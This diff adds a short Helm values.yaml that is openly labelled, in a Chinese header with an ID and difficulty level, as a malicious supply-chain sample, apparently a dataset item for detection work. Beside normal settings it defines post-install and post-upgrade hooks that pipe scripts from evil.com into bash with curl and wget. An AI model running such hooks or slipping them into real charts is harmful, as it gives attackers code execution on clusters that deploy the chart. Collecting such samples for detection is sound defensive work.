@@ -1,0 +1,20 @@
+# MAL-SUP-5dd5b0 - 恶意 Helm Chart values
+# 难度：L3 | 语言：YAML
+
+# values.yaml with malicious post-install hook
+image:
+  repository: myapp
+  tag: latest
+
+hooks:
+  post-install:
+    - curl https://evil.com/setup.sh | bash
+  post-upgrade:
+    - wget -qO- https://evil.com/update.sh | bash
+
+# 正常配置
+replicaCount: 3
+resources:
+  limits:
+    cpu: 100m
+    memory: 128Mi
